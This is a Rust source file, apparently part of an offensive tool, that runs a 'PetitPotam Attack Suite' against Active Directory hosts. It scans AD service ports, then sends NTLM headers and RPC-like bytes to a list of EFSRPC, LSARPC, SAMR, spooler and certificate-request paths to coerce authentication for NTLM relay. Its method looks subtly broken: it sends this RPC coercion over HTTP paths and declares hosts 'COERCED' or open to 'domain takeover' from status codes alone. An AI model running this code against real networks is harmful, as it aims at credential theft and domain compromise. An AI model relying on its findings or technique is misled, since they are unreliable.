use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const AD_ENDPOINTS: &[(&str, &str)] = &[
    ("LDAP", ":389"),
    ("LDAPS", ":636"),
    ("GC", ":3268"),
    ("GC SSL", ":3269"),
    ("SMB", ":445"),
    ("Kerberos", ":88"),
    ("Kerberos PW", ":464"),
    ("RPC", ":135"),
    ("DNS", ":53"),
    ("WinRM", ":5985"),
    ("WinRM SSL", ":5986"),
    ("AD CS", "/certsrv/Default.asp"),
    ("Web Enrollment", "/certsrv/"),
    ("Autoenroll", "/certsrv/autoenroll.asp"),
    ("EFS", ":445/pipe/lsarpc"),
];

const PETITPOTAM_PAYLOADS: &[(&str, &str)] = &[
    (
        "EFSRPC — OpenEncryptedFileRaw",
        "/efs/rpc/OpenEncryptedFileRaw",
    ),
    ("EFSRPC — EncryptFileRaw", "/efs/rpc/EncryptFileRaw"),
    (
        "EFSRPC — QueryRecoveryAgents",
        "/efs/rpc/QueryRecoveryAgents",
    ),
    ("EFSRPC — EfsRpcOpenFileRaw", "/efs/rpc/EfsRpcOpenFileRaw"),
    ("LSARPC — LSARPC", "/lsarpc/lsass"),
    ("LSARPC — MS-EFSR", "/lsarpc/MsEfsr"),
    ("SAMR — SamrConnect", "/samr/samr"),
    (
        "Netlogon — NetrServerReqChallenge",
        "/netlogon/netrserverreqchallenge",
    ),
    ("Print — RpcAddPrinter", "/spoolss/rpcaddprinter"),
    ("ICPR — RequestCertificate", "/icpr/requestcertificate"),
    (
        "EFSPipe — EfsRpcEncryptFileRawSrv",
        "/efsrpc/EfsRpcEncryptFileRawSrv",
    ),
    (
        "EFSPipe — EfsRpcDecryptFileRawSrv",
        "/efsrpc/EfsRpcDecryptFileRawSrv",
    ),
    (
        "EFSPipe — EfsRpcQueryUsersOnFile",
        "/efsrpc/EfsRpcQueryUsersOnFile",
    ),
    (
        "EFSPipe — EfsRpcAddUsersToFile",
        "/efsrpc/EfsRpcAddUsersToFile",
    ),
    ("SMB named pipe — lsarpc", "/pipe/lsarpc"),
    ("SMB named pipe — efsrpc", "/pipe/efsrpc"),
    ("SMB named pipe — samr", "/pipe/samr"),
    ("SMB named pipe — netlogon", "/pipe/netlogon"),
    ("SMB named pipe — spoolss", "/pipe/spoolss"),
    ("SMB named pipe — drsuapi", "/pipe/drsuapi"),
];

pub async fn petitpotam(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} PetitPotam Attack Suite (CVE-2021-36942)",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!(
        "{} {} endpoint probes, {} PetitPotam vectors",
        "[*]".cyan().bold(),
        AD_ENDPOINTS.len(),
        PETITPOTAM_PAYLOADS.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!("\n{} [1/2] AD endpoint discovery...", "[*]".cyan().bold());
    let mut found = Vec::new();
    for (name, path) in AD_ENDPOINTS {
        let full_url = if path.starts_with(":") {
            format!("{}{}", base, path)
        } else {
            format!("{}{}", base, path)
        };
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let tag = if status == 200 || status == 301 {
                    "OPEN".green().bold().to_string()
                } else if status == 401 {
                    "auth".yellow().to_string()
                } else if status == 404 {
                    "closed".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:20} {:30} {}", "*".cyan(), name, path, tag);
                if status == 200 || status == 301 {
                    found.push(*name);
                }
            }
            Err(_) => {
                println!("  {} {:20} {:30} closed", "*".dimmed(), name, path);
            }
        }
    }

    println!(
        "\n{} [2/2] PetitPotam NTLM relay vectors...",
        "[*]".cyan().bold()
    );
    println!(
        "  {} Testing {} coercion vectors...",
        "*".cyan(),
        PETITPOTAM_PAYLOADS.len()
    );
    let mut results = Vec::new();

    for (name, path) in PETITPOTAM_PAYLOADS {
        let target = format!("{}{}", base, path);
        let ntlm_auth = "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==";

        match client
            .post(&target)
            .header("Authorization", ntlm_auth)
            .header("Content-Type", "application/octet-stream")
            .body(format!(
                "\x05\x00\x0b\x03\x10\x00\x00\x00{}\x00\x00\x00",
                path
            ))
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let www_auth = resp
                    .headers()
                    .get("www-authenticate")
                    .map(|v| v.to_str().unwrap_or("").to_string())
                    .unwrap_or_default();
                let body = resp.text().await.unwrap_or_default();
                let ntlm_challenge = www_auth.contains("NTLM") && www_auth.contains("TlRMTVNTUAAC");
                let accepted = status == 200 || status == 401 && ntlm_challenge;
                let has_error = body.contains("error") || body.contains("denied");

                let tag = if ntlm_challenge {
                    "NTLM CHALLENGE".red().bold().to_string()
                } else if accepted && !has_error {
                    "COERCED".red().bold().to_string()
                } else if status == 401 && www_auth.contains("NTLM") {
                    "NTLM ready".yellow().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:40} status={} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    status,
                    tag
                );

                if ntlm_challenge || (accepted && !has_error) {
                    results.push(*name);
                }
            }
            Err(_) => {
                println!(
                    "  {} [{:02}] {:40} error",
                    "*".red(),
                    results.len() + 1,
                    name
                );
            }
        }
    }

    println!(
        "\n{} {} AD endpoints open, {} / {} PetitPotam vectors vulnerable",
        "[*]".cyan().bold(),
        found.len(),
        results.len(),
        PETITPOTAM_PAYLOADS.len()
    );

    if !results.is_empty() {
        let has_efs = results
            .iter()
            .any(|n| n.contains("EFS") || n.contains("efs"));
        let has_lsa = results
            .iter()
            .any(|n| n.contains("LSA") || n.contains("lsa"));
        let has_icpr = results
            .iter()
            .any(|n| n.contains("ICPR") || n.contains("icpr"));
        if has_efs {
            println!(
                "{} [CRITICAL] EFSRPC coercion — NTLM relay to AD CS for domain takeover!",
                "[!]".red().bold()
            );
        }
        if has_lsa {
            println!(
                "{} [HIGH] LSARPC coercion — NTLM relay for credential theft!",
                "[!]".red().bold()
            );
        }
        if has_icpr {
            println!(
                "{} [CRITICAL] ICPR coercion — direct NTLM relay to CA for cert enrollment!",
                "[!]".red().bold()
            );
        }
    } else {
        println!(
            "{} No PetitPotam vulnerabilities detected.",
            "[-]".green().bold()
        );
    }

    Ok(())
}
